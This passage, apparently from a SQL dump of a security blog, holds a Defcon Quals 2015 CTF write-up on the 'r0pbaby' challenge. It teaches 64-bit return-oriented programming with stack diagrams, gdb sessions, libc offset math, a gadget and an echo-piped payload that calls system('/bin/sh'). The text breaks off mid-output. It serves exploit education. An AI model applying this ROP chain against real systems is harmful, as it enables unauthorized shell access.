go. I was never really sure if I was doing the right thing at each step of the way, but it worked!\nAn alternate solution\nIf I\'d had the presence of mind to realize that the username would always be the password, there\'s another obvious solution to the problem that probably would have been a whole lot easier.\nThe string \"grumpy\" (as both the username and the password) is only read in three different places in the binary. It would have been fairly trivial to:\n\nFind a place in the binary where there\'s some room (right on top of the old \"grumpy\" would be fine)\nPut the string \"duchess\" in this location (and the other potential usernames if you don\'t yet know which one has administrative access)\nPatch the three references to \"grumpy\" to point to the new string instead of the old one - unfortunately, using a new location instead of just overwriting the strings is necessary because \"duchess\" is longer than \"grumpy\" so there\'s no room\nRun the program and let it get the key itself\n\nThat would have been quicker and easier, but I wasn\'t confident enough that the usernames and passwords would be the same, and I didn\'t want to risk going down the wrong path with almost no time left, so I decided against trying that.\nConclusion\nThis wasn\'t the most exciting level I\'ve ever done, but it was quick and gave me the opportunity to do some mildly interesting reverse engineering.\nThe main idea was to show off my process - translate line by line, instrument it, debug till it works, then refactor and reduce and clean up the code!', '\'Defcon Quals 2015\'', 'https://blog.skullsecurity.org/2015/defcon-quals-access-control-simple-reverse-engineer');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (13, 'Defcon Quals: r0pbaby (simple 64-bit ROP)', 'Ron Bowes', '2015-5-20', 'This past weekend I competed in the Defcon CTF Qualifiers from the Legit Business Syndicate. In the past it\'s been one of my favourite competitions, and this year was no exception!\nUnfortunately, I got stuck for quite a long time on a 2-point problem (\"wwtw\") and spent most of my weekend on it. But I did do a few others - r0pbaby included - and am excited to write about them, as well!\nr0pbaby is neat, because it\'s an absolute bare-bones ROP (return-oriented programming) level. Quite honestly, when it makes sense, I actually prefer using a ROP chain to using shellcode. Much of the time, it\'s actually easier! You can see the binary, my solution, and other stuff I used on this github repo.\nIt might make sense to read a post I made in 2013 about a level in PlaidCTF called ropasaurusrex. But it\'s not really necessary - I\'m going to explain the same stuff again with two years more experience!\n\nWhat is ROP?\nMost modern systems have DEP - data execution prevention - enabled. That means that when trying to run arbitrary code, the code has be in memory that\'s executable. Typically, when a process is running, all memory segments are either writable (+w) or executable (+x) - not both. That\'s sometimes called \"W^X\", but it seems more appropriate to just call it common sense.\nROP - return-oriented programming - is an exploitation technique that bypasses DEP. It does that by chaining together legitimate code that\'s already in executable memory. This requires the attacker to either a) have complete control of the stack, or b) have control of rip/eip (the instruction pointer register) and the ability to change esp/rsp (the stack pointer) to point to another buffer.\nAs a quick example, let\'s say you overwrite the return address of a vulnerable function with the address of libc\'s sleep() function. When the vulnerable function attempts to return, instead of returning to where it\'s supposed to (or returning to shellcode), it\'ll return to the first line of sleep().\nOn a 32-bit system, sleep() will look at the next-to-next value on the stack to find out how long to sleep(). On a 64-bit system, it\'ll look at the value of the rdi register for its argument, which is a little more elaborate to set up. When it\'s done, it\'ll return to the next value on the stack on both architectures, which could very well be another function.\nSo basically, sleep() expects its stack to look like on 32-bit:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+\r\n|         1000         | <-- sleep() looks here for its param (on 32-bit)\r\n+----------------------+\r\n|     [return addr]    | <-- where esp will be when sleep() is entered\r\n+----------------------+\r\n|    [sleep\'s  addr]   | <-- return addr of previous function\r\n+----------------------+\r\n|...lower addresses....| <-- other data from previous function\r\n+----------------------+\r\n\nAnd on 64-bit:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+ <-- sleep()\'s param is in rdi, so it\'s not needed here\r\n|     [return addr]    | <-- where rsp will be when sleep() is entered\r\n+----------------------+\r\n|    [sleep\'s  addr]   | <-- return addr of previous function\r\n+----------------------+\r\n|...lower addresses....| <-- other data from previous function\r\n+----------------------+\r\n\nWe\'ll dive into deeper detail of how to set this up and see way more stack diagrams shortly. But let\'s start from the beginning!\nTaking a first look\nWhen you run r0pbaby, or connect to their service, you will see a prompt (the program uses stdin/stdout for i/o):\n\r\n$ ./r0pbaby\r\n\r\nWelcome to an easy Return Oriented Programming challenge...\r\nMenu:\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n:\r\n\nIt\'s worthwhile messing with the options a bit to get a feel for it:\n\r\n$ ./r0pbaby\r\n\r\nWelcome to an easy Return Oriented Programming challenge...\r\nMenu:\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: 1\r\nlibc.so.6: 0x00007FFFF7FF8B28\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: 2\r\nEnter symbol: system\r\nSymbol system: 0x00007FFFF7883960\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: 2\r\nEnter symbol: printf\r\nSymbol printf: 0x00007FFFF7892F10\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: 3\r\nEnter bytes to send (max 1024): hello???\r\nInvalid amount.\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n:\r\n\nWe\'ll look at option 3 more in a little while, but for now let\'s take a quick look at options 1 and 2. The rest of this section isn\'t directly applicable to the exploitation stuff, so you\'re free to skip it if you want. :)\nIf you look at the results from option 1 and option 2, you\'ll see one strange thing: the return from \"Get libc address\" is higher than the addresses of printf() and system(). It also isn\'t page aligned (a multiple of 0x1000 (4096), usually), so it almost certainly isn\'t actually the base address (which, in fairness, the level doesn\'t explicitly say it is).\nI messed around a bit out of curiosity. Here\'s what I discovered...\nFirst, run the program in gdb and get the address that they claim is libc:\n\r\n$ gdb -q ./r0pbaby\r\nReading symbols from ./r0pbaby...(no debugging symbols found)...done.\r\n(gdb) run\r\nStarting program: /home/ron/defcon-quals/r0pbaby/r0pbaby\r\n\r\nWelcome to an easy Return Oriented Programming challenge...\r\nMenu:\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: 1\r\nlibc.so.6: 0x00007FFFF7FF8B28\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n\nSo that\'s what it returns: 0x00007FFFF7FF8B28. Now we use ctrl-c to break into the debugger and figure out the real base address:\n\r\n: ^C\r\nProgram received signal SIGINT, Interrupt.\r\n0x00007ffff791e5e0 in __read_nocancel () from /lib64/libc.so.6\r\n(gdb) info proc map\r\nprocess 5475\r\nMapped address spaces:\r\n\r\n          Start Addr           End Addr       Size     Offset objfile\r\n      0x555555554000     0x555555556000     0x2000        0x0 /home/ron/defcon-quals/r0pbaby/r0pbaby\r\n      0x555555755000     0x555555757000     0x2000     0x1000 /home/ron/defcon-quals/r0pbaby/r0pbaby\r\n      0x555555757000     0x555555778000    0x21000        0x0 [heap]\r\n      0x7ffff7842000     0x7ffff79cf000   0x18d000        0x0 /lib64/libc-2.20.so\r\n      0x7ffff79cf000     0x7ffff7bce000   0x1ff000   0x18d000 /lib64/libc-2.20.so\r\n      0x7ffff7bce000     0x7ffff7bd2000     0x4000   0x18c000 /lib64/libc-2.20.so\r\n      0x7ffff7bd2000     0x7ffff7bd4000     0x2000   0x190000 /lib64/libc-2.20.so\r\n[...]\r\n\nThis tells us that the actual address where libc is loaded is 0x7ffff7842000. Theirs was definitely wrong!\nOn a Linux system, the first 4 bytes at the base address will usually be \"\\x7fELF\" or \"\\x7f\\x45\\x4c\\x46\". We can check the first four bytes at the actual base address to verify:\n\r\n(gdb) x/8xb 0x7ffff7842000\r\n0x7ffff7842000: 0x7f    0x45    0x4c    0x46    0x02    0x01    0x01    0x00\r\n(gdb) x/8xc 0x7ffff7842000\r\n0x7ffff7842000: 127 \'\\177\'      69 \'E\'  76 \'L\'  70 \'F\'  2 \'\\002\'        1 \'\\001\'        1 \'\\001\'        0 \'\\000\'\r\n\nAnd we can check the base address that the program tells us:\n\r\n(gdb) x/8xb 0x00007FFFF7FF8B28\r\n0x7ffff7ff8b28: 0x00    0x20    0x84    0xf7    0xff    0x7f    0x00    0x00\r\n\nFrom experience, that looks like a 64-bit address to me (6 bytes long, starts with 0x7f if you read it in little endian), so I tried print it as a 64-bit value:\n\r\n(gdb) x/xg 0x00007FFFF7FF8B28\r\n0x7ffff7ff8b28: 0x00007ffff7842000\r\n\nAha! It\'s a pointer to the actual base address! It seems a little odd to send that to the user, it does them basically no good, so I\'ll assume that it\'s a bug. :)\nStealing libc\nIf there\'s one thing I hate, it\'s attacking a level blind. Based on the output so far, it\'s pretty clear that they\'re going to want us to call a libc function, but they don\'t actually give us a copy of libc.so! While it\'s not strictly necessary, having a copy of libc.so makes this far easier.\nI\'ll post more details about how and why to steal libc in a future post, but for now, suffice to stay: if you can, beat the easiest 64-bit level first (like babycmd) and liberate a copy of libc.so. Also snag a 32-bit version of libc if you can find one. Believe me, you\'ll be thankful for it later! To make it possible to follow the rest of this post, here\'s libc-2.19.so from babycmd and here\'s libc-2.20.so from my box, which is the one I\'ll use for this writeup.\nYou might be wondering how to verify whether or not that actually IS the right library. For now, let\'s consider that to be homework. I\'ll be writing more about that in the future, I promise!\nFind a crash\nI played around with option 3 for awhile, but it kept giving me a length error. So I used the best approach for annoying CTF problems: I asked a teammate who\'d already solved that problem. He\'d reverse engineered the function already, saving me the trouble. :)\nIt turns out that the correct way to format things is by sending a length, then a newline, then the payload:\n\r\n$ ./r0pbaby\r\n\r\nWelcome to an easy Return Oriented Programming challenge...\r\nMenu:\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: 3\r\nEnter bytes to send (max 1024): 20\r\nAAAAAAAAAAAAAAAAAAAA\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: Bad choice.\r\nSegmentation fault\r\n\nWell, that may be one of the easiest ways I\'ve gotten a segfault! But the work isn\'t quite done. :)\nrip control\nOur first goal is going to be to get control of rip (that\'s like eip, the instruction pointer, but on a 64-bit system). As you probably know by now, rip is the register that points to the current instruction being executed. If we move it, different code runs. The classic attack is to move eip to point at shellcode, but ROP is different. We want to carefully control rip to make sure it winds up in all the right places.\nBut first, let\'s non-carefully control it!\nThe program indicates that it\'s writing the r0p buffer to the stack, so the easiest thing to do is probably to start throwing stuff into the buffer to see what happens. I like to send a string with a series of values I\'ll recognize in a debugger. Since it\'s a 64-bit app, I send 8 \"A\"s, 8 \"B\"s, and so on. If it doesn\'t crash. I send more.\n\r\n$ gdb -q ./r0pbaby\r\n(gdb) run\r\n\r\n[...]\r\n\r\n: 3\r\nEnter bytes to send (max 1024): 32\r\nAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: Bad choice.\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x0000555555554eb3 in ?? ()\r\n\nAll right, it crashes at 0x0000555555554eb3. Let\'s take a look at what lives at the current instruction (pro-tip: \"x/i $rip\" or equivalent is basically always the first thing I run on any crash I\'m investigating):\n\r\n(gdb) x/i $rip\r\n=> 0x555555554eb3:      ret\r\n\nIt\'s crashing while attempting to return! That generally only happens when either the stack pointer is messed up...\n\r\n(gdb) print/x $rsp\r\n$1 = 0x7fffffffd918\r\n\n...which it doesn\'t appear to be, or when it\'s trying to return to a bad address...\n\r\n(gdb) x/xg $rsp\r\n0x7fffffffd918: 0x4242424242424242\r\n\n...which it is! It\'s trying to return to 0x4242424242424242 (\"BBBBBBBB\"), which is an illegal address (the first two bytes have to be zero on a 64-bit system).\nWe can confirm this, and also prove to ourselves that NUL bytes are allowed in the input, by sending a couple of NUL bytes. I\'m switching to using \'echo\' on the commandline now, so I can easily add NUL bytes (keep in mind that because of little endian, the NUL bytes have to go after the \"B\"s, not before):\n\r\n$ ulimit -c unlimited\r\n$ echo -ne \'3\\n32\\nAAAAAAAABBBBBB\\0\\0CCCCCCCCDDDDDDDD\\n\' | ./r0pbaby\r\n[...]\r\nSegmentation fault (core dumped)\r\n$ gdb ./r0pbaby ./core\r\n[...]\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x0000424242424242 in ?? ()\r\n\nNow we can see that rip was successfully set to 0x0000424242424242 (\"BBBBBB\\0\\0\" because of little endian)!\nHow\'s the stack work again?\nAs I said at the start, reading my post about ropasaurusrex would be a good way to get acquainted with ROP exploits. If you\'re pretty comfortable with stacks or you\'ve recently read/understood that post, feel free to skip this section!\nLet\'s start by talking about 32-bit systems - where parameters are passed on the stack instead of in registers. I\'ll explain how to deal with register parameters in 64-bit below.\nOkay, so: a program\'s stack is a run-time structure that holds temporary values that functions need. Things like the parameters, the local variables, the return address, and other stuff. When a function is called, it allocates itself some space on the stack by growing downward (towards lower memory addresses) When the function returns, the data\'s all removed from the stack (it\'s not actually wiped from memory, it just becomes free to get overwritten). The register rsp always points to the most recent thing pushed to the stack and the next thing that would be popped off the stack.\nLet\'s use sleep() as an example again. You call sleep() like this:\n\r\n1: push 1000\r\n2: call sleep\r\n\nor like this:\n\r\n1. mov [esp], 1000\r\n2: call sleep\r\n\nThey\'re identical, as far as sleep() is concerned. The first is a tiny bit more memory efficient and the second is a tiny bit faster, but that\'s about it.\nBefore line 1, we don\'t know or care what\'s on the stack. We can look at it like this (I\'m choosing completely arbitrary addresses so you can match up diagrams with each other):\n\r\n       +----------------------+\r\n       |...higher addresses...|\r\n       +----------------------+\r\n0x1040 |     (irrelevant)     |\r\n       +----------------------+\r\n0x103c |     (irrelevant)     |\r\n       +----------------------+\r\n0x1038 |     (irrelevant)     | <-- rsp\r\n       +----------------------+\r\n0x1034 |       (unused)       |\r\n       +----------------------+\r\n0x1030 |       (unused)       |\r\n       +----------------------+\r\n       |...lower addresses....|\r\n       +----------------------+\r\n\nValues lower than rsp are unused. That means that as far as the stack\'s concerned, they\'re unallocated. They might be zero, or they might contain values from previous function calls. In a properly working system, they\'re never read. If they\'re accidentally used (like if somebody declares a variable but forgets to initialize it), you could wind up with a use-after-free vulnerability or similar.\nThe value that rsp is pointing to and the values above it (at higher addresses) also don\'t really matter. They\'re part of the stack frame for the function that\'s calling sleep(), and sleep() doesn\'t care about those. It only cares about its own stack frame (a stack frame, as we\'ll see, is the parameters, return address, saved registers, and local variables of a function - basically, everything the function stores on the stack and everything it cares about on the stack).\nLine 1 pushes 1000 onto the stack. The frame will then look like this:\n\r\n       +----------------------+\r\n       |...higher addresses...|\r\n       +----------------------+\r\n0x103c |     (irrelevant)     |\r\n       +----------------------+\r\n0x1038 |     (irrelevant)     | <-- stuff from the previous function\r\n       +----------------------+\r\n       +----------------------+ <-- start of sleep()\'s stack frame\r\n0x1034 |         1000         | <-- rsp\r\n       +----------------------+\r\n0x1030 |       (unused)       |\r\n       +----------------------+\r\n       |...lower addresses....|\r\n       +----------------------+\r\n\nWhen you call the function at line 2, it pushes the return address onto the stack, like this:\n\r\n       +----------------------+\r\n       |...higher addresses...|\r\n       +----------------------+\r\n0x1038 |     (irrelevant)     |\r\n       +----------------------+\r\n       +----------------------+ <-- start of sleep()\'s stack frame\r\n0x1034 |         1000         |\r\n       +----------------------+\r\n0x1030 |     [return addr]    | <-- rsp\r\n       +----------------------+\r\n0x102c |       (unused)       |\r\n       +----------------------+\r\n0x1028 |       (unused)       |\r\n       +----------------------+\r\n0x1024 |       (unused)       |\r\n       +----------------------+\r\n       |...lower addresses....|\r\n       +----------------------+\r\n\nNote how rsp has moved from 0x1038 to 0x1034 to 0x1030 as stuff is added to the stack. But it always points to the last thing added!\nLet\'s look at how sleep() might be implemented. This is a very common function prelude:\n100; sleep():\n101: push rbp\n102: mov rbp, rsp\n103: sub rsp, 0x20\n104: ...everything else...\n(Note that those are line numbers for reference, not actual addresses, so please don\'t get upset that the values don\'t increment enough :) )\nAt line 100, the old frame pointer is saved to the stack:\n\r\n       +----------------------+\r\n       |...higher addresses...|\r\n       +----------------------+\r\n0x1038 |     (irrelevant)     |\r\n       +----------------------+\r\n       +----------------------+ <-- start of sleep()\'s stack frame\r\n0x1034 |         1000         |\r\n       +----------------------+\r\n0x1030 |     [return addr]    |\r\n       +----------------------+\r\n0x102c |     [saved frame]    | <-- rsp\r\n       +----------------------+\r\n0x1028 |       (unused)       |\r\n       +----------------------+\r\n0x1024 |       (unused)       |\r\n       +----------------------+\r\n0x1020 |       (unused)       |\r\n       +----------------------+\r\n       |...lower addresses....|\r\n       +----------------------+\r\n\nThen at line 102, nothing on the stack changes. On line 103, 0x20 is subtracted from esp, which effectively reserves 0x20 (32) bytes for local variables:\n\r\n       +----------------------+\r\n       |...higher addresses...|\r\n       +----------------------+\r\n0x1038 |     (irrelevant)     |\r\n       +----------------------+\r\n       +----------------------+ <-- start of sleep()\'s stack frame\r\n0x1034 |         1000         |\r\n       +----------------------+\r\n0x1030 |     [return addr]    |\r\n       +----------------------+\r\n0x102c |     [saved frame]    |\r\n       +----------------------+\r\n       |                      |\r\n0x1028 |                      |\r\n   -   |     [local vars]     | <-- rsp\r\n0x1008 |                      |\r\n       |                      |\r\n       +----------------------+ <-- end of sleep()\'s stack frame\r\n       +----------------------+\r\n0x1004 |       (unused)       |\r\n       +----------------------+\r\n0x1000 |       (unused)       |\r\n       +----------------------+\r\n       |...lower addresses....|\r\n       +----------------------+\r\n\nAnd that\'s the entire stack frame for the sleep(0 function call! It\'s possible that there are other registers preserved on the stack, in addition to rbp, but that doesn\'t really change anything. We only care about the parameters and the return address.\nIf sleep() calls a function, the same process will happen:\n\r\n       +----------------------+\r\n       |...higher addresses...|\r\n       +----------------------+\r\n0x1038 |     (irrelevant)     |\r\n       +----------------------+\r\n       +----------------------+ <-- start of sleep()\'s stack frame\r\n0x1034 |         1000         |\r\n       +----------------------+\r\n0x1030 |     [return addr]    |\r\n       +----------------------+\r\n0x102c |     [saved frame]    |\r\n       +----------------------+\r\n       |                      |\r\n0x1028 |                      |\r\n   -   |     [local vars]     |\r\n0x1008 |                      |\r\n       |                      |\r\n       +----------------------+ <-- end of sleep()\'s stack frame\r\n       +----------------------+ <-- start of next function\'s stack frame\r\n0x1004 |       [params]       |\r\n       +----------------------+\r\n0x1000 |     [return addr]    |\r\n       +----------------------+\r\n0x0ffc |     [saved frame]    |\r\n       +----------------------+\r\n       |                      |\r\n0x0ffc |                      |\r\n   -   |     [local vars]     |\r\n0x0fb4 |                      |\r\n       |                      |\r\n       +----------------------+ <-- end of next function\'s stack frame\r\n       +----------------------+\r\n0x0fb0 |       (unused)       |\r\n       +----------------------+\r\n0x0fac |       (unused)       |\r\n       +----------------------+\r\n       |...lower addresses....|\r\n       +----------------------+\r\n\nAnd so on, with the stack constantly growing towards lower addresses. When the function returns, the same thing happens in reverse order (the local vars are removed from the stack by adding to rsp (or replacing it with rbp), rbp is popped off the stack, and the return address is popped and returned to).\nThe parameters are cleared off the stack by either the caller or callee, depending on the compiler, but that won\'t come into play for this writeup. However, when ROP is used to call multiple functions, unless the function clean up their own parameters off the stack, the exploit developer has to do it themselves. Typically, on Windows functions clean up after themselves but on other OSes they don\'t (but you can\'t rely on that). This is done by using a \"pop ret\", \"pop pop ret\", etc., after each function call. See my ropasaurusrex writeup for more details.\nEnter: 64-bit\nThe fact that this level is 64-bit complicates things in important ways (and ways that I always seem to forget about till things don\'t work).\nSpecifically, in 64-bit, the first handful of parameters to a function are passed in registers, not on the stack. I don\'t have the order of registers memorized - I forget it after every CTF, along with whether ja/jb or jl/jg are the unsigned ones - but the first two are rdi and rsi. That means that to call the same sleep() function on 64-bit, we\'d have this code instead:\n\r\n1: mov rdi, 1000\r\n2: call sleep\r\n\nAnd its stack frame would look like this:\n\r\n       +----------------------+\r\n       |...higher addresses...|\r\n       +----------------------+ <-- start of previous function\'s stack frame\r\n       +----------------------+ <-- start of sleep()\'s stack frame\r\n0x1030 |     [return addr]    |\r\n       +----------------------+\r\n0x102c |     [saved frame]    |\r\n       +----------------------+\r\n       |                      |\r\n0x1028 |                      |\r\n   -   |     [local vars]     |\r\n0x1008 |                      |\r\n       |                      |\r\n       +----------------------+ <-- end of sleep()\'s stack frame\r\n       +----------------------+\r\n       |...lower addresses....|\r\n       +----------------------+\r\n\nNo parameters, just the return address, saved frame pointer, and local variables. It\'s exceedingly rare for the stack to be used for parameters on 64-bit.\nStacks: the important bit\nOkay, so that\'s a stack frame. A stack frame contains parameters, return address, saved registers, and local variables. On 64-bit, it usually contains the return address, saved registers, and local variables (no parameters).\nBut here\'s the thing: when you enter a function - that is to say, when you start running the first line of the function - the function doesn\'t really know where you came from. I mean, not really. It knows the return address that\'s on the stack, but doesn\'t really have a way to validate that it\'s real (except with advanced exploitation mitigations). It also knows that there are some parameters right before (at higher addresses than) the return address, if it\'s 32-bit. Or that rdi/rsi/etc. contain parameters if it\'s 64-bit.\nSo let\'s say you overwrote the return address on the stack and returned to the first line of sleep(). What\'s it going to do?\nAs we saw, on 64-bit, sleep() expects its stack frame to contain a return address:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+\r\n+----------------------+ <-- start of sleep()\'s stack frame\r\n|     [return addr]    | <-- rsp\r\n+----------------------+\r\n|     (unallocated)    |\r\n+----------------------+\r\n|...lower addressess...|\r\n+----------------------+\r\n\nsleep() will push some registers, make room for local variables, and really just do its own thing. When it\'s all done, it\'ll grab the return address from the stack, return to it, and somebody will move rsp back to the calling function\'s stack frame (it, getting rid of the parameters from the stack).\nUsing system()\nBecause this level uses stdout and stdin for i/o, all we really have to do is make this call:\n\r\nsystem(\"/bin/sh\")\r\n\nThen we can run arbitrary commands. Seems pretty simple, eh? We don\'t even care where system() returns to, once it\'s done the program can just crash!\nYou just have to do two things:\n\nset rip to the address of system()\nset rdi to a pointer to the string \"/bin/sh\" (or just \"sh\" if you prefer)\n\nSetting rip to the address of system() is easy. We have the address of system() and we have rip control, as we discovered. It\'s just a matter of grabbing the address of system() and using that in the overflow.\nSetting rdi to the pointer to \"/bin/sh\" is a little more problematic, though. First, we need to find the address of \"/bin/sh\" somehow. Then we need a \"gadget\" to put it in rdi. A \"gadget\", in ROP, refers to a small piece of code that performs an operation then returns.\nIt turns out, all of the above can be easily done by using a copy of libc.so. Remember how I told you it\'d come in handy?\nFinding \"/bin/sh\"\nSo, this is actually pretty easy. We need to find \"/bin/sh\" given a) the ability to leak an address in libc.so (which this program does by design), and b) a copy of libc.so. Even with ASLR turned on, any two addresses within the same binary (like within libc.so or within the binary itself) won\'t change their relative positions to each other. Addresses in two different binaries will likely be different, though.\nIf you fire up IDA, and go to the \"strings\" tab (shift-F12), you can search for \"/bin/sh\". You\'ll see that \"/bin/sh\" will have an address something like 0x7ffff6aa307c.\nAlternatively, you can use this gdb command (helpfully supplied by bla from io.sts):\n\r\n(gdb) find /b 0x7ffff7842000,0x7ffff7bd4000, \'/\',\'b\',\'i\',\'n\',\'/\',\'s\',\'h\'\r\n0x7ffff79a307c\r\nwarning: Unable to access 16000 bytes of target memory at 0x7ffff79d5d03, halting search.\r\n1 pattern found.\r\n(gdb) x/s 0x7ffff79a307c\r\n0x7ffff79a307c: \"/bin/sh\"\r\n\nOnce you\'ve obtained the address of \"/bin/sh\", find the address of any libc function - we\'ll use system(), since system() will come in handy later. The address will be something like 0x00007ffff6983960. If you subtract the two addresses, you\'ll discover that the address of \"/bin/sh\" is 0x11f71c bytes after the address of system(). As I said earlier, that won\'t change, so we can reliably use that in our exploit.\nNow when you run the program:\n\r\n$ ./r0pbaby\r\n\r\nWelcome to an easy Return Oriented Programming challenge...\r\nMenu:\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: 2\r\nEnter symbol: system\r\nSymbol system: 0x00007FFFF7883960\r\n\nYou can easily calculate that the address of the string \"/bin/sh\" will be at 0x00007ffff7883960 + 0x11f71c = 0x7ffff79a307c.\nGetting \"/bin/sh\" into rdi\nThe next thing you\'ll want to do is put \"/bin/sh\" into rdi. We can do that in two steps (recall that we have control of the stack - it\'s the point of the level):\n\nPut it on the stack\nFind a \"pop rdi\" gadget\n\nTo do this, I literally searched for \"pop     rdi\" in IDA. With the spaces and everything! :)\nI found this in both my own copy of libc and the one I stole from babycmd:\n\r\n.text:00007FFFF80E1DF1                 pop     rax\r\n.text:00007FFFF80E1DF2                 pop     rdi\r\n.text:00007FFFF80E1DF3                 call    rax\r\n\nWhat a beautiful sequence! It pops the next value of the stack into rax, pops the next value into rdi, and calls rax. So it calls an address from the stack with a parameter read from the stack. It\'s such a lovely gadget! I was surprised and excited to find it, though I\'m sure every other CTF team already knew about it. :)\nThe absolute address that IDA gives us is 0x00007ffff80e1df1, but just like the \"/bin/sh\" string, the address relative to the rest of the binary never changes. If you subtract the address of system() from that address, you\'ll get 0xa7969 (on my copy of libc).\nLet\'s look at an example of what\'s actually going on when we call that gadget. You\'re at the end of main() and getting ready to return. rsp is pointing to what it thinks is the return address, but is really \"BBBBBBBB\"-now-gadget_addr:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+\r\n|       DDDDDDDD       |\r\n+----------------------+\r\n|       CCCCCCCC       |\r\n+----------------------+\r\n|  0x00007ffff80e1df1  | <-- rsp\r\n+----------------------+\r\n|       AAAAAAAA       |\r\n+----------------------+\r\n|...lower addresses....|\r\n+----------------------+\r\n\nWhen the return happens, it looks like this:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+\r\n|       DDDDDDDD       |\r\n+----------------------+\r\n|       CCCCCCCC       | <-- rsp\r\n+----------------------+\r\n|  0x00007FFFF80E1DF1  |\r\n+----------------------+\r\n|       AAAAAAAA       |\r\n+----------------------+\r\n|...lower addresses....|\r\n+----------------------+\r\n\nThe first instruction - pop rax - runs. rax is now 0x4343434343434343 (\"CCCCCCCC\").\nThe second instruction - pop rdi - runs. rdi is now 0x4444444444444444 (\"DDDDDDDD\").\nThen the final instruction - call rax - is called. It\'ll attempt to call 0x4343434343434343, with 0x4444444444444444 as its parameter, and crash. Controlling both the called address and the parameter is a huge win!\nPutting it all together\nI realize this is a lot to take in if you can\'t read stacks backwards and forwards (trust me, I frequently read stacks backwards - in fact, I wrote this entire blog post with upside-down stacks before I noticed and had to go back and fix it! :) ).\nHere\'s what we have:\n\nThe ability to write up to 1024 bytes onto the stack\nThe ability to get the address of system()\nThe ability to get the address of \"/bin/sh\", based on the address of system()\nThe ability to get the address of a sexy gadget, also based on system(), that\'ll call something from the stack with a parameter from the stack\n\nWe\'re overflowing a local variable in main(). Immediately before our overflow, this is what main()\'s stack frame probably looks like:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+ <-- start of main()\'s stack frame\r\n|         argv         |\r\n+----------------------+\r\n|         argc         |\r\n+----------------------+\r\n|     [return addr]    | <-- return address of main()\r\n+----------------------+\r\n|     [saved frame]    | <-- overflowable variable must start here\r\n+----------------------+\r\n|                      |\r\n|                      |\r\n|     [local vars]     | <-- rsp\r\n|                      |\r\n|                      |\r\n+----------------------+ <-- end of main()\'s stack frame\r\n|...lower addresses....|\r\n+----------------------+\r\n\nBecause you only get 8 bytes before you hit the return address, the first 8 bytes are probably overwriting the saved frame pointer (or whatever, it doesn\'t really matter, but you can prove it\'s the frame pointer by using a debugger and verifying that rbp is 0x4141414141414141 after it returns (it is)).\nThe main thing is, as we saw earlier, if you send the string \"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD\", the \"BBBBBBBB\" winds up as main()\'s return address. That means the stack winds up looking like this before main() starts cleaning up its stack frame:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+ <-- WAS the start of main()\'s stack frame\r\n|       DDDDDDDD       |\r\n+----------------------+\r\n|       CCCCCCCC       |\r\n+----------------------+\r\n|       BBBBBBBB       | <-- return address of main()\r\n+----------------------+\r\n|       AAAAAAAA       | <-- overflowable variable must start here\r\n+----------------------+\r\n|                      |\r\n|                      |\r\n|     [local vars]     |\r\n|                      |\r\n|                      | <-- rsp\r\n+----------------------+ <-- end of main()\'s stack frame\r\n|...lower addresses....|\r\n+----------------------+\r\n\nWhen main attempts to return, it tries to return to 0x4242424242424242 as we saw earlier, and it crashes.\nNow, one thing we can do is return directly to system(). But your guess is as good as mine as to what\'s in rdi, but you can bet it\'s not going to be \"/bin/sh\". So instead, we return to our gadget:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+ <-- start of main()\'s stack frame\r\n|       DDDDDDDD       |\r\n+----------------------+\r\n|       CCCCCCCC       |\r\n+----------------------+\r\n|     gadget_addr      | <-- return address of main()\r\n+----------------------+\r\n|       AAAAAAAA       | <-- overflowable variable must start here\r\n+----------------------+\r\n|                      |\r\n|                      |\r\n|     [local vars]     |\r\n|                      |\r\n|                      | <-- rsp\r\n+----------------------+ <-- end of main()\'s stack frame\r\n|...lower addresses....|\r\n+----------------------+\r\n\nSince I have ASLR off on my computer (if you do turn it off, please make sure you turn it back on!), I can pre-compute the addresses I need.\nSymbol system: 0x00007FFFF7883960 (from the program)\nsh_addr = system_addr + 0x11f71c\nsh_addr = 0x00007ffff7883960 + 0x11f71c\nsh_addr = 0x7ffff79a307c\ngadget_addr = system_addr + 0xa7969\ngadget_addr = 0x00007ffff7883960 + 0xa7969\ngadget_addr = 0x7ffff792b2c9\nSo now, let\'s change the exploit we used to crash it a long time ago (we replace the \"B\"s with the address of our gadget, in little endian format:\n\r\n$ echo -ne \'3\\n32\\nAAAAAAAA\\xc9\\xb2\\x92\\xf7\\xff\\x7f\\x00\\x00CCCCCCCCDDDDDDDD\\n\' | ./r0pbaby\r\nWelcome to an easy Return Oriented Programming 